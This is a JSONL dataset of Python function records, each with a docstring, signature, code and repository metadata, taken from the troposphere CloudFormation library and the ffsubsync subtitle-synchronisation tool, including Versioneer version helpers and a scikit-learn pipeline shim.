{"docstring": "\"\"\" Provides special handling for the autoscaling.Metadata object \"\"\"\n", "func_signal": "def _generate_autoscaling_metadata(self, cls, args):\n", "code": "assert isinstance(args, Mapping)\ninit_config = self._create_instance(\n    cloudformation.InitConfig,\n    args['AWS::CloudFormation::Init']['config'])\ninit = self._create_instance(\n    cloudformation.Init, {'config': init_config})\nauth = None\nif 'AWS::CloudFormation::Authentication' in args:\n    auth_blocks = {}\n    for k in args['AWS::CloudFormation::Authentication']:\n        auth_blocks[k] = self._create_instance(\n            cloudformation.AuthenticationBlock,\n            args['AWS::CloudFormation::Authentication'][k],\n            k)\n    auth = self._create_instance(\n        cloudformation.Authentication, auth_blocks)\n\nreturn cls(init, auth)", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\" Returns a map of `FunctionName: FunctionClass` \"\"\"\n", "func_signal": "def inspect_functions(self):\n", "code": "if not self._inspect_functions:\n    d = {}\n    for m in self.inspect_members:\n        if issubclass(m, AWSHelperFn):\n            d[m.__name__] = m\n\n    TemplateGenerator._inspect_functions = d\n\nreturn self._inspect_functions", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\"\nInstantiates a new Troposphere Template based on an existing\nCloudformation Template.\n\"\"\"\n", "func_signal": "def __init__(self, cf_template, **kwargs):\n", "code": "super(TemplateGenerator, self).__init__()\nif 'CustomMembers' in kwargs:\n    self._custom_members = set(kwargs[\"CustomMembers\"])\n\nself._reference_map = {}\nif 'AWSTemplateFormatVersion' in cf_template:\n    self.set_version(cf_template['AWSTemplateFormatVersion'])\nif 'Transform' in cf_template:\n    self.add_transform(cf_template['Transform'])\nif 'Description' in cf_template:\n    self.set_description(cf_template['Description'])\nif 'Metadata' in cf_template:\n    self.add_metadata(cf_template['Metadata'])\nfor k, v in cf_template.get('Parameters', {}).iteritems():\n    self.add_parameter(self._create_instance(Parameter, v, k))\nfor k, v in cf_template.get('Mappings', {}).iteritems():\n    self.add_mapping(k, self._convert_definition(v))\nfor k, v in cf_template.get('Conditions', {}).iteritems():\n    self.add_condition(k, self._convert_definition(v, k))\nfor k, v in cf_template.get('Resources', {}).iteritems():\n    self.add_resource(self._convert_definition(\n                            v, k,\n                            self._get_resource_type_cls(k, v)\n    ))\nfor k, v in cf_template.get('Outputs', {}).iteritems():\n    self.add_output(self._create_instance(Output, v, k))", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\"\nDynamically allocates a new CustomResource class definition using the\nspecified Custom::SomeCustomName resource type. This special resource\ntype is equivalent to the AWS::CloudFormation::CustomResource.\n\"\"\"\n", "func_signal": "def _generate_custom_type(self, resource_type):\n", "code": "if not resource_type.startswith(\"Custom::\"):\n    raise TypeError(\"Custom types must start with Custom::\")\ncustom_type = type(\n    str(resource_type.replace(\"::\", \"\")),\n    (self.inspect_resources['AWS::CloudFormation::CustomResource'],),\n    {'resource_type': resource_type})\nself.inspect_members.add(custom_type)\nself.inspect_resources[resource_type] = custom_type\nreturn custom_type", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "# ensure troposphere works with longs and ints\n", "func_signal": "def test_it_allows_an_rds_instance_with_iops(self):\n", "code": "try:\n    long_number = long(2000)\nexcept NameError:\n    # Python 3 doesn't have 'long' anymore\n    long_number = 2000\nrds_instance = rds.DBInstance(\n    'SomeTitle',\n    AllocatedStorage=200,\n    DBInstanceClass='db.m1.small',\n    Engine='MySQL',\n    MasterUsername='SomeUsername',\n    MasterUserPassword='SomePassword',\n    StorageType='io1',\n    Iops=long_number,\n)\n\nrds_instance.to_dict()", "path": "troposphere/tests/test_rds.py", "commit_date": "2020-03-16 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\"\nReturns the list of all troposphere members we are able to\nconstruct\n\"\"\"\n", "func_signal": "def inspect_members(self):\n", "code": "if not self._inspect_members:\n    TemplateGenerator._inspect_members = \\\n        self._import_all_troposphere_modules()\nreturn self._inspect_members", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\" Returns a map of `ResourceType: ResourceClass` \"\"\"\n", "func_signal": "def inspect_resources(self):\n", "code": "if not self._inspect_resources:\n    d = {}\n    for m in self.inspect_members:\n        if issubclass(m, (AWSObject, cloudformation.AWSCustomObject)) \\\n                and hasattr(m, 'resource_type'):\n            d[m.resource_type] = m\n\n    TemplateGenerator._inspect_resources = d\n\nreturn self._inspect_resources", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\"Return a + if we don't already have one, else return a .\"\"\"\n", "func_signal": "def plus_or_dot(pieces):\n", "code": "if \"+\" in pieces.get(\"closest-tag\", \"\"):\n    return \".\"\nreturn \"+\"", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Git-specific installation logic for Versioneer.\n\nFor Git, this means creating/changing .gitattributes to mark _version.py\nfor export-subst keyword substitution.\n\"\"\"\n", "func_signal": "def do_vcs_install(manifest_in, versionfile_source, ipy):\n", "code": "GITS = [\"git\"]\nif sys.platform == \"win32\":\n    GITS = [\"git.cmd\", \"git.exe\"]\nfiles = [manifest_in, versionfile_source]\nif ipy:\n    files.append(ipy)\ntry:\n    me = __file__\n    if me.endswith(\".pyc\") or me.endswith(\".pyo\"):\n        me = os.path.splitext(me)[0] + \".py\"\n    versioneer_file = os.path.relpath(me)\nexcept NameError:\n    versioneer_file = \"versioneer.py\"\nfiles.append(versioneer_file)\npresent = False\ntry:\n    f = open(\".gitattributes\", \"r\")\n    for line in f.readlines():\n        if line.strip().startswith(versionfile_source):\n            if \"export-subst\" in line.strip().split()[1:]:\n                present = True\n    f.close()\nexcept EnvironmentError:\n    pass\nif not present:\n    f = open(\".gitattributes\", \"a+\")\n    f.write(\"%s export-subst\\n\" % versionfile_source)\n    f.close()\n    files.append(\".gitattributes\")\nrun_command(GITS, [\"add\", \"--\"] + files)", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "# context manager TemporaryDirectory not available on py2\n", "func_signal": "def test_sync_matches_ground_truth(args, truth, should_filecmp, should_detect_encoding):\n", "code": "dirpath = tempfile.mkdtemp()\ntry:\n    args.srtout = os.path.join(dirpath, 'test' + os.path.splitext(args.srtin[0])[-1])\n    assert ffsubsync.run(args)['retval'] == 0\n    if should_filecmp:\n        assert filecmp.cmp(args.srtout, truth, shallow=False)\n    else:\n        assert timestamps_roughly_match(args.srtout, truth)\n    if should_detect_encoding is not None:\n        assert detected_encoding(args.srtin[0]) == should_detect_encoding\nfinally:\n    shutil.rmtree(dirpath)", "path": "ffsubsync/tests/test_integration.py", "commit_date": "2020-11-28 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Get the project root directory.\n\nWe require that all commands are run from the project root, i.e. the\ndirectory that contains setup.py, setup.cfg, and versioneer.py .\n\"\"\"\n", "func_signal": "def get_root():\n", "code": "root = os.path.realpath(os.path.abspath(os.getcwd()))\nsetup_py = os.path.join(root, \"setup.py\")\nversioneer_py = os.path.join(root, \"versioneer.py\")\nif not (os.path.exists(setup_py) or os.path.exists(versioneer_py)):\n    # allow 'python path/to/setup.py COMMAND'\n    root = os.path.dirname(os.path.realpath(os.path.abspath(sys.argv[0])))\n    setup_py = os.path.join(root, \"setup.py\")\n    versioneer_py = os.path.join(root, \"versioneer.py\")\nif not (os.path.exists(setup_py) or os.path.exists(versioneer_py)):\n    err = (\"Versioneer was unable to run the project root directory. \"\n           \"Versioneer requires setup.py to be executed from \"\n           \"its immediate directory (like 'python setup.py COMMAND'), \"\n           \"or in a way that lets it use sys.argv[0] to find the root \"\n           \"(like 'python path/to/setup.py COMMAND').\")\n    raise VersioneerBadRootError(err)\ntry:\n    # Certain runtime workflows (setup.py install/develop in a setuptools\n    # tree) execute all dependencies in a single python process, so\n    # \"versioneer\" may be imported multiple times, and python's shared\n    # module-import table will cache the first one. So we can't use\n    # os.path.dirname(__file__), as that will find whichever\n    # versioneer.py was first imported, even in later projects.\n    me = os.path.realpath(os.path.abspath(__file__))\n    me_dir = os.path.normcase(os.path.splitext(me)[0])\n    vsr_dir = os.path.normcase(os.path.splitext(versioneer_py)[0])\n    if me_dir != vsr_dir:\n        print(\"Warning: build in %s is using versioneer.py from %s\"\n              % (os.path.dirname(me), versioneer_py))\nexcept NameError:\n    pass\nreturn root", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Fit the model and transform with the final estimator\n\nFits all the transforms one after the other and transforms the\ndata, then uses fit_transform on transformed data with the final\nestimator.\n\nParameters\n----------\nX : iterable\n    Training data. Must fulfill input requirements of first step of the\n    pipeline.\n\ny : iterable, default=None\n    Training targets. Must fulfill label requirements for all steps of\n    the pipeline.\n\n**fit_params : dict of string -> object\n    Parameters passed to the ``fit`` method of each step, where\n    each parameter name is prefixed such that parameter ``p`` for step\n    ``s`` has key ``s__p``.\n\nReturns\n-------\nXt : array-like of shape  (n_samples, n_transformed_features)\n    Transformed samples\n\"\"\"\n", "func_signal": "def fit_transform(self, X, y=None, **fit_params):\n", "code": "last_step = self._final_estimator\nXt, fit_params = self._fit(X, y, **fit_params)\nif last_step == 'passthrough':\n    return Xt\nif hasattr(last_step, 'fit_transform'):\n    return last_step.fit_transform(Xt, y, **fit_params)\nelse:\n    return last_step.fit(Xt, y, **fit_params).transform(Xt)", "path": "ffsubsync/ffsubsync/sklearn_shim.py", "commit_date": "2020-06-03 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Get version from 'git describe' in the root of the source tree.\n\nThis only gets called if the git-archive 'subst' keywords were *not*\nexpanded, and _version.py hasn't already been rewritten with a short\nversion string, meaning we're inside a checked out source tree.\n\"\"\"\n", "func_signal": "def git_pieces_from_vcs(tag_prefix, root, verbose, run_command=run_command):\n", "code": "GITS = [\"git\"]\nif sys.platform == \"win32\":\n    GITS = [\"git.cmd\", \"git.exe\"]\n\nout, rc = run_command(GITS, [\"rev-parse\", \"--git-dir\"], cwd=root,\n                      hide_stderr=True)\nif rc != 0:\n    if verbose:\n        print(\"Directory %s not under git control\" % root)\n    raise NotThisMethod(\"'git rev-parse --git-dir' returned error\")\n\n# if there is a tag matching tag_prefix, this yields TAG-NUM-gHEX[-dirty]\n# if there isn't one, this yields HEX[-dirty] (no NUM)\ndescribe_out, rc = run_command(GITS, [\"describe\", \"--tags\", \"--dirty\",\n                                      \"--always\", \"--long\",\n                                      \"--match\", \"%s*\" % tag_prefix],\n                               cwd=root)\n# --long was added in git-1.5.5\nif describe_out is None:\n    raise NotThisMethod(\"'git describe' failed\")\ndescribe_out = describe_out.strip()\nfull_out, rc = run_command(GITS, [\"rev-parse\", \"HEAD\"], cwd=root)\nif full_out is None:\n    raise NotThisMethod(\"'git rev-parse' failed\")\nfull_out = full_out.strip()\n\npieces = {}\npieces[\"long\"] = full_out\npieces[\"short\"] = full_out[:7]  # maybe improved later\npieces[\"error\"] = None\n\n# parse describe_out. It will be like TAG-NUM-gHEX[-dirty] or HEX[-dirty]\n# TAG might have hyphens.\ngit_describe = describe_out\n\n# look for -dirty suffix\ndirty = git_describe.endswith(\"-dirty\")\npieces[\"dirty\"] = dirty\nif dirty:\n    git_describe = git_describe[:git_describe.rindex(\"-dirty\")]\n\n# now we have TAG-NUM-gHEX or HEX\n\nif \"-\" in git_describe:\n    # TAG-NUM-gHEX\n    mo = re.search(r'^(.+)-(\\d+)-g([0-9a-f]+)$', git_describe)\n    if not mo:\n        # unparseable. Maybe git-describe is misbehaving?\n        pieces[\"error\"] = (\"unable to parse git-describe output: '%s'\"\n                           % describe_out)\n        return pieces\n\n    # tag\n    full_tag = mo.group(1)\n    if not full_tag.startswith(tag_prefix):\n        if verbose:\n            fmt = \"tag '%s' doesn't start with prefix '%s'\"\n            print(fmt % (full_tag, tag_prefix))\n        pieces[\"error\"] = (\"tag '%s' doesn't start with prefix '%s'\"\n                           % (full_tag, tag_prefix))\n        return pieces\n    pieces[\"closest-tag\"] = full_tag[len(tag_prefix):]\n\n    # distance: number of commits since tag\n    pieces[\"distance\"] = int(mo.group(2))\n\n    # commit: short hex revision ID\n    pieces[\"short\"] = mo.group(3)\n\nelse:\n    # HEX: no tags\n    pieces[\"closest-tag\"] = None\n    count_out, rc = run_command(GITS, [\"rev-list\", \"HEAD\", \"--count\"],\n                                cwd=root)\n    pieces[\"distance\"] = int(count_out)  # total number of commits\n\n# commit date: see ISO-8601 comment in git_versions_from_keywords()\ndate = run_command(GITS, [\"show\", \"-s\", \"--format=%ci\", \"HEAD\"],\n                   cwd=root)[0].strip()\npieces[\"date\"] = date.strip().replace(\" \", \"T\", 1).replace(\" \", \"\", 1)\n\nreturn pieces", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Fit the model\n\nFit all the transforms one after the other and transform the\ndata, then fit the transformed data using the final estimator.\n\nParameters\n----------\nX : iterable\n    Training data. Must fulfill input requirements of first step of the\n    pipeline.\n\ny : iterable, default=None\n    Training targets. Must fulfill label requirements for all steps of\n    the pipeline.\n\n**fit_params : dict of string -> object\n    Parameters passed to the ``fit`` method of each step, where\n    each parameter name is prefixed such that parameter ``p`` for step\n    ``s`` has key ``s__p``.\n\nReturns\n-------\nself : Pipeline\n    This estimator\n\"\"\"\n", "func_signal": "def fit(self, X, y=None, **fit_params):\n", "code": "Xt, fit_params = self._fit(X, y, **fit_params)\nif self._final_estimator != 'passthrough':\n    self._final_estimator.fit(Xt, y, **fit_params)\nreturn self", "path": "ffsubsync/ffsubsync/sklearn_shim.py", "commit_date": "2020-06-03 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Write the given version number to the given _version.py file.\"\"\"\n", "func_signal": "def write_to_version_file(filename, versions):\n", "code": "os.unlink(filename)\ncontents = json.dumps(versions, sort_keys=True,\n                      indent=1, separators=(\",\", \": \"))\nwith open(filename, \"w\") as f:\n    f.write(SHORT_VERSION_PY % contents)\n\nprint(\"set %s to '%s'\" % (filename, versions[\"version\"]))", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "# shallow copy of steps - this should really be steps_\n", "func_signal": "def _fit(self, X, y=None, **fit_params):\n", "code": "self.steps = list(self.steps)\nself._validate_steps()\n\nfit_params_steps = {name: {} for name, step in self.steps\n                    if step is not None}\nfor pname, pval in fit_params.items():\n    if '__' not in pname:\n        raise ValueError(\n            \"Pipeline.fit does not accept the {} parameter. \"\n            \"You can pass parameters to specific steps of your \"\n            \"pipeline using the stepname__parameter format, e.g. \"\n            \"`Pipeline.fit(X, y, logisticregression__sample_weight\"\n            \"=sample_weight)`.\".format(pname))\n    step, param = pname.split('__', 1)\n    fit_params_steps[step][param] = pval\nfor (step_idx,\n     name,\n     transformer) in self._iter(with_final=False,\n                                filter_passthrough=False):\n    if transformer is None or transformer == 'passthrough':\n        continue\n\n    # Fit or load from cache the current transformer\n    X, fitted_transformer = _fit_transform_one(\n        transformer, X, y, None,\n        **fit_params_steps[name])\n    # Replace the transformer of the step with the fitted\n    # transformer. This is necessary when loading the transformer\n    # from the cache.\n    self.steps[step_idx] = (name, fitted_transformer)\nif self._final_estimator == 'passthrough':\n    return X, {}\nreturn X, fit_params_steps[self.steps[-1][0]]", "path": "ffsubsync/ffsubsync/sklearn_shim.py", "commit_date": "2020-06-03 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "# The following is true only on Windows.\n", "func_signal": "def subprocess_args(include_stdout=True):\n", "code": "if hasattr(subprocess, 'STARTUPINFO'):\n    # On Windows, subprocess calls will pop up a command window by default\n    # when run from Pyinstaller with the ``--noconsole`` option. Avoid this\n    # distraction.\n    si = subprocess.STARTUPINFO()\n    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW\n    # Windows doesn't search the path by default. Pass it an environment so\n    # it will.\n    env = os.environ\nelse:\n    si = None\n    env = None\n\n# ``subprocess.check_output`` doesn't allow specifying ``stdout``::\n#\n#   Traceback (most recent call last):\n#     File \"test_subprocess.py\", line 58, in <module>\n#       **subprocess_args(stdout=None))\n#     File \"C:\\Python27\\lib\\subprocess.py\", line 567, in check_output\n#       raise ValueError('stdout argument not allowed, it will be overridden.')\n#   ValueError: stdout argument not allowed, it will be overridden.\n#\n# So, add it only if it's needed.\nif include_stdout:\n    ret = {'stdout': subprocess.PIPE}\nelse:\n    ret = {}\n\n# On Windows, running this from the binary produced by Pyinstaller\n# with the ``--noconsole`` option requires redirecting everything\n# (stdin, stdout, stderr) to avoid an OSError exception\n# \"[Error 6] the handle is invalid.\"\nret.update({'stdin': subprocess.PIPE,\n            'stderr': subprocess.PIPE,\n            'startupinfo': si,\n            'env': env})\nreturn ret", "path": "ffsubsync/ffsubsync/ffmpeg_utils.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Extract version information from the given file.\"\"\"\n# the code embedded in _version.py can just fetch the value of these\n# keywords. When used from setup.py, we don't want to import _version.py,\n# so we do it with a regexp instead. This function is not used from\n# _version.py.\n", "func_signal": "def git_get_keywords(versionfile_abs):\n", "code": "keywords = {}\ntry:\n    f = open(versionfile_abs, \"r\")\n    for line in f.readlines():\n        if line.strip().startswith(\"git_refnames =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"refnames\"] = mo.group(1)\n        if line.strip().startswith(\"git_full =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"full\"] = mo.group(1)\n        if line.strip().startswith(\"git_date =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"date\"] = mo.group(1)\n    f.close()\nexcept EnvironmentError:\n    pass\nreturn keywords", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Apply transforms, and transform with the final estimator\n\nThis also works where final estimator is ``None``: all prior\ntransformations are applied.\n\nParameters\n----------\nX : iterable\n    Data to transform. Must fulfill input requirements of first step\n    of the pipeline.\n\nReturns\n-------\nXt : array-like of shape  (n_samples, n_transformed_features)\n\"\"\"\n# _final_estimator is None or has transform, otherwise attribute error\n# XXX: Handling the None case means we can't use if_delegate_has_method\n", "func_signal": "def transform(self):\n", "code": "if self._final_estimator != 'passthrough':\n    self._final_estimator.transform\nreturn self._transform", "path": "ffsubsync/ffsubsync/sklearn_shim.py", "commit_date": "2020-06-03 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Extract version information from the given file.\"\"\"\n# the code embedded in _version.py can just fetch the value of these\n# keywords. When used from setup.py, we don't want to import _version.py,\n# so we do it with a regexp instead. This function is not used from\n# _version.py.\n", "func_signal": "def git_get_keywords(versionfile_abs):\n", "code": "keywords = {}\ntry:\n    f = open(versionfile_abs, \"r\")\n    for line in f.readlines():\n        if line.strip().startswith(\"git_refnames =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"refnames\"] = mo.group(1)\n        if line.strip().startswith(\"git_full =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"full\"] = mo.group(1)\n        if line.strip().startswith(\"git_date =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"date\"] = mo.group(1)\n    f.close()\nexcept EnvironmentError:\n    pass\nreturn keywords", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"TAG[.post.devDISTANCE] -- No -dirty.\n\nExceptions:\n1: no tags. 0.post.devDISTANCE\n\"\"\"\n", "func_signal": "def render_pep440_pre(pieces):\n", "code": "if pieces[\"closest-tag\"]:\n    rendered = pieces[\"closest-tag\"]\n    if pieces[\"distance\"]:\n        rendered += \".post.dev%d\" % pieces[\"distance\"]\nelse:\n    # exception #1\n    rendered = \"0.post.dev%d\" % pieces[\"distance\"]\nreturn rendered", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Get version information from git keywords.\"\"\"\n", "func_signal": "def git_versions_from_keywords(keywords, tag_prefix, verbose):\n", "code": "if not keywords:\n    raise NotThisMethod(\"no keywords at all, weird\")\ndate = keywords.get(\"date\")\nif date is not None:\n    # git-2.2.0 added \"%cI\", which expands to an ISO-8601 -compliant\n    # datestamp. However we prefer \"%ci\" (which expands to an \"ISO-8601\n    # -like\" string, which we must then edit to make compliant), because\n    # it's been around since git-1.5.3, and it's too difficult to\n    # discover which version we're using, or to work around using an\n    # older one.\n    date = date.strip().replace(\" \", \"T\", 1).replace(\" \", \"\", 1)\nrefnames = keywords[\"refnames\"].strip()\nif refnames.startswith(\"$Format\"):\n    if verbose:\n        print(\"keywords are unexpanded, not using\")\n    raise NotThisMethod(\"unexpanded keywords, not a git-archive tarball\")\nrefs = set([r.strip() for r in refnames.strip(\"()\").split(\",\")])\n# starting in git-1.8.3, tags are listed as \"tag: foo-1.0\" instead of\n# just \"foo-1.0\". If we see a \"tag: \" prefix, prefer those.\nTAG = \"tag: \"\ntags = set([r[len(TAG):] for r in refs if r.startswith(TAG)])\nif not tags:\n    # Either we're using git < 1.8.3, or there really are no tags. We use\n    # a heuristic: assume all version tags have a digit. The old git %d\n    # expansion behaves like git log --decorate=short and strips out the\n    # refs/heads/ and refs/tags/ prefixes that would let us distinguish\n    # between branches and tags. By ignoring refnames without digits, we\n    # filter out many common branch names like \"release\" and\n    # \"stabilization\", as well as \"HEAD\" and \"master\".\n    tags = set([r for r in refs if re.search(r'\\d', r)])\n    if verbose:\n        print(\"discarding '%s', no digits\" % \",\".join(refs - tags))\nif verbose:\n    print(\"likely tags: %s\" % \",\".join(sorted(tags)))\nfor ref in sorted(tags):\n    # sorting will prefer e.g. \"2.0\" over \"2.0rc1\"\n    if ref.startswith(tag_prefix):\n        r = ref[len(tag_prefix):]\n        if verbose:\n            print(\"picking %s\" % r)\n        return {\"version\": r,\n                \"full-revisionid\": keywords[\"full\"].strip(),\n                \"dirty\": False, \"error\": None,\n                \"date\": date}\n# no suitable tags, so version is \"0+unknown\", but full hex is still there\nif verbose:\n    print(\"no suitable tags, using unknown + full revision id\")\nreturn {\"version\": \"0+unknown\",\n        \"full-revisionid\": keywords[\"full\"].strip(),\n        \"dirty\": False, \"error\": \"no suitable tags\", \"date\": None}", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Store f in HANDLERS[vcs][method].\"\"\"\n", "func_signal": "def decorate(f):\n", "code": "if vcs not in HANDLERS:\n    HANDLERS[vcs] = {}\nHANDLERS[vcs][method] = f\nreturn f", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"TAG-DISTANCE-gHEX[-dirty].\n\nLike 'git describe --tags --dirty --always -long'.\nThe distance/hash is unconditional.\n\nExceptions:\n1: no tags. HEX[-dirty]  (note: no 'g' prefix)\n\"\"\"\n", "func_signal": "def render_git_describe_long(pieces):\n", "code": "if pieces[\"closest-tag\"]:\n    rendered = pieces[\"closest-tag\"]\n    rendered += \"-%d-g%s\" % (pieces[\"distance\"], pieces[\"short\"])\nelse:\n    # exception #1\n    rendered = pieces[\"short\"]\nif pieces[\"dirty\"]:\n    rendered += \"-dirty\"\nreturn rendered", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Main VCS-independent setup function for installing Versioneer.\"\"\"\n", "func_signal": "def do_setup():\n", "code": "root = get_root()\ntry:\n    cfg = get_config_from_root(root)\nexcept (EnvironmentError, configparser.NoSectionError,\n        configparser.NoOptionError) as e:\n    if isinstance(e, (EnvironmentError, configparser.NoSectionError)):\n        print(\"Adding sample versioneer config to setup.cfg\",\n              file=sys.stderr)\n        with open(os.path.join(root, \"setup.cfg\"), \"a\") as f:\n            f.write(SAMPLE_CONFIG)\n    print(CONFIG_ERROR, file=sys.stderr)\n    return 1\n\nprint(\" creating %s\" % cfg.versionfile_source)\nwith open(cfg.versionfile_source, \"w\") as f:\n    LONG = LONG_VERSION_PY[cfg.VCS]\n    f.write(LONG % {\"DOLLAR\": \"$\",\n                    \"STYLE\": cfg.style,\n                    \"TAG_PREFIX\": cfg.tag_prefix,\n                    \"PARENTDIR_PREFIX\": cfg.parentdir_prefix,\n                    \"VERSIONFILE_SOURCE\": cfg.versionfile_source,\n                    })\n\nipy = os.path.join(os.path.dirname(cfg.versionfile_source),\n                   \"__init__.py\")\nif os.path.exists(ipy):\n    try:\n        with open(ipy, \"r\") as f:\n            old = f.read()\n    except EnvironmentError:\n        old = \"\"\n    if INIT_PY_SNIPPET not in old:\n        print(\" appending to %s\" % ipy)\n        with open(ipy, \"a\") as f:\n            f.write(INIT_PY_SNIPPET)\n    else:\n        print(\" %s unmodified\" % ipy)\nelse:\n    print(\" %s doesn't exist, ok\" % ipy)\n    ipy = None\n\n# Make sure both the top-level \"versioneer.py\" and versionfile_source\n# (PKG/_version.py, used by runtime code) are in MANIFEST.in, so\n# they'll be copied into source distributions. Pip won't be able to\n# install the package without this.\nmanifest_in = os.path.join(root, \"MANIFEST.in\")\nsimple_includes = set()\ntry:\n    with open(manifest_in, \"r\") as f:\n        for line in f:\n            if line.startswith(\"include \"):\n                for include in line.split()[1:]:\n                    simple_includes.add(include)\nexcept EnvironmentError:\n    pass\n# That doesn't cover everything MANIFEST.in can do\n# (http://docs.python.org/2/distutils/sourcedist.html#commands), so\n# it might give some false negatives. Appending redundant 'include'\n# lines is safe, though.\nif \"versioneer.py\" not in simple_includes:\n    print(\" appending 'versioneer.py' to MANIFEST.in\")\n    with open(manifest_in, \"a\") as f:\n        f.write(\"include versioneer.py\\n\")\nelse:\n    print(\" 'versioneer.py' already in MANIFEST.in\")\nif cfg.versionfile_source not in simple_includes:\n    print(\" appending versionfile_source ('%s') to MANIFEST.in\" %\n          cfg.versionfile_source)\n    with open(manifest_in, \"a\") as f:\n        f.write(\"include %s\\n\" % cfg.versionfile_source)\nelse:\n    print(\" versionfile_source already in MANIFEST.in\")\n\n# Make VCS-specific changes. For git, this means creating/changing\n# .gitattributes to mark _version.py for export-subst keyword\n# substitution.\ndo_vcs_install(manifest_in, cfg.versionfile_source, ipy)\nreturn 0", "path": "ffsubsync/versioneer.py", "commit_date": "2020-06-08 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"Returns a sub-pipeline or a single esimtator in the pipeline\n\nIndexing with an integer will return an estimator; using a slice\nreturns another Pipeline instance which copies a slice of this\nPipeline. This copy is shallow: modifying (or fitting) estimators in\nthe sub-pipeline will affect the larger pipeline and vice-versa.\nHowever, replacing a value in `step` will not affect a copy.\n\"\"\"\n", "func_signal": "def __getitem__(self, ind):\n", "code": "if isinstance(ind, slice):\n    if ind.step not in (1, None):\n        raise ValueError('Pipeline slicing only supports a step of 1')\n    return self.__class__(self.steps[ind])\ntry:\n    name, est = self.steps[ind]\nexcept TypeError:\n    # Not an int, try get step by name\n    return self.named_steps[ind]\nreturn est", "path": "ffsubsync/ffsubsync/sklearn_shim.py", "commit_date": "2020-06-03 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
